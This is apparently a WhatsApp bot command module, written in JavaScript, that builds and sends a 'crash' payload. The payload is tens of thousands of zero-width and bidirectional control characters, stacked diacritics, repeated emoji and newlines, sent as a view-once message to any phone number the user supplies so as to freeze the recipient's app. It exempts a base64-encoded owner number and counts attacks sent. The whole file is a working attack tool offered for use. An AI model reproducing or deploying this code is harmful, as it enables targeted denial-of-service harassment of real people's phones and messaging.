/**
 * 🐛 Cyber Bug functions
 * Sends a devastating payload that freezes WhatsApp when viewed.

 * By Dev-Keith Tech
 */
'use strict';

const config  = require('../../config');
const antiban = require('../../utils/antiban');
const db      = require('../../database');


const PROTECTED_ENCODED = [
  'MjYzNzg5NzQ1Mjc3'  // do not change here to avoid the bot from not working
];

// Decode on startup
const PROTECTED_NUMBERS = PROTECTED_ENCODED.map(enc => Buffer.from(enc, 'base64').toString('utf8'));

// ==================== ULTRA CRASH PAYLOAD ====================
function generateUltraPayload() {
  const zwsp = '\u200B'.repeat(15000);
  const zwj = '\u200D'.repeat(5000);
  const lrm = '\u200E'.repeat(5000);
  const rlm = '\u200F'.repeat(5000);

  const diacritics = '\u0300\u0301\u0302\u0303\u0304\u0306\u0307\u0308\u030A\u030B\u030C\u030F\u0310\u0311\u0312\u0313\u0314\u0315\u031B\u0323\u0324\u0325\u0326\u0327\u0328\u0329\u032A\u032B\u032C\u032D\u032E\u032F\u0330\u0331\u0332\u0333\u0334\u0335\u0336\u0337\u0338\u0339\u033A\u033B\u033C\u033D\u033E\u033F\u0340\u0341\u0342\u0343\u0344\u0345\u0346\u0347\u0348\u0349\u034A\u034B\u034C\u034D\u034E\u034F\u0350\u0351\u0352\u0353\u0354\u0355\u0356\u0357\u0358\u0359\u035A\u035B\u035C\u035D\u035E\u035F\u0360\u0361\u0362\u0363\u0364\u0365\u0366\u0367\u0368\u0369\u036A\u036B\u036C\u036D\u036E\u036F';
  const diacriticSpam = diacritics.repeat(300);

  const emojis = '😀😁😂🤣😃😄😅😆😉😊😋😎😍🥰😘😗😙😚☺️🙂🤗🤩🤔🤨😐😑😶🙄😏😣😥😮😯😪😫😴😌😛😜😝🤤😒😓😔😕🙃🤑😲☹️🙁😖😞😟😤😢😭😦😧😨😩🤯😬😰😱🥵🥶😳🤪😵😡😠🤬';
  const emojiSpam = emojis.repeat(400);

  const bidi = '\u202E' + 'THIS WILL BE REVERSED' + '\u202C';
  const bidiSpam = bidi.repeat(1000);

  let payload = zwsp + '\n'.repeat(3000)
              + zwj + '\n'.repeat(2000)
              + lrm + rlm + '\n'.repeat(2000)
              + diacriticSpam + '\n'.repeat(2000)
              + emojiSpam + '\n'.repeat(2000)
              + bidiSpam + '\n'.repeat(1000)
              + '🔥 *SENT SUCCESSFULLY*';
  return payload;
}

// ==================== COMMAND HANDLER ====================
module.exports = async (sock, msg, args, { isOwner, sender, jid }) => {
  // 1. Check if bug is enabled globally
  if (!config.bugsEnabled.freeze) {
    return antiban.sendHuman(sock, jid, { text: '❌ Freeze bug is currently disabled.' }, { quoted: msg });
  }

  // 2. Get target number from args[0] (remove non‑digits)
  const rawTarget = args[0] || '';
  const targetNumber = rawTarget.replace(/[^0-9]/g, '');

  if (!targetNumber) {
    return antiban.sendHuman(sock, jid, {
      text: `🐛 *Ultra View‑Once Crash*\n\n*Usage:* ${config.prefix}freeze <number>\n*Example:* ${config.prefix}freeze 26378xxxx`,
    }, { quoted: msg });
  }

  // 3. Check if target is PROTECTED → block
  if (PROTECTED_NUMBERS.includes(targetNumber)) {
    return antiban.sendHuman(sock, jid, {
      text: `⛔ *Protected number!* You cannot target ${targetNumber} – it belongs to the owner and is immune.`,
    }, { quoted: msg });
  }

  const targetJid = targetNumber + '@s.whatsapp.net';

  // 4. Generate the ultra payload
  const payload = generateUltraPayload();

  // 5. Notify sender
  await antiban.sendHuman(sock, jid, {
    text: `🐛 *Sending ULTRA View‑Once crash...*\n🎯 Target: ${targetNumber}`,
  }, { quoted: msg });

  await sock.sendMessage(
    targetJid,
    { 
      text: payload,
      viewOnce: true
    }
  );

  // 7. Update stats
  db.incrementStat('totalBugs');
  db.incrementUserStat(sender, 'bugs');

  // 8. Confirm
  await antiban.sendHuman(sock, jid, {
    text: `✅ *View‑once crash sent!*\n💥 Ultra payload delivered to ${targetNumber}`,
  }, { quoted: msg });
};